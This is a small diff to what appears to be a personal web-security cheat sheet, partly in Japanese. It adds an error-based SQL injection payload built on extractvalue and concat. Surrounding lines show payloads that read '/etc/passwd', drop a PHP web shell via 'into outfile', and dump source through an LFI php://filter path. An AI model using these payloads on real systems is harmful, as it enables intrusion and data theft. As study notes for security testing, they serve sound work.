@@ -235,6 +235,9 @@
       - '/etc/passwd' is a client file
     - select '<?php ?>' into outfile '/var/www/html/shell.php';
       - '/var/www/html/shell.php' is a server file
+    - `extractvalue(0, concat(0x0a, (select * from tables)))`
+      - Errorベースの際に有効
+      - extractvalueは引数にxpathを取るが、concat部分がxpathではないため、エラーとして、concatの文字列を返す
     
   - LFI
     - php://filter/convert.base64-encode/resource=file_name.php
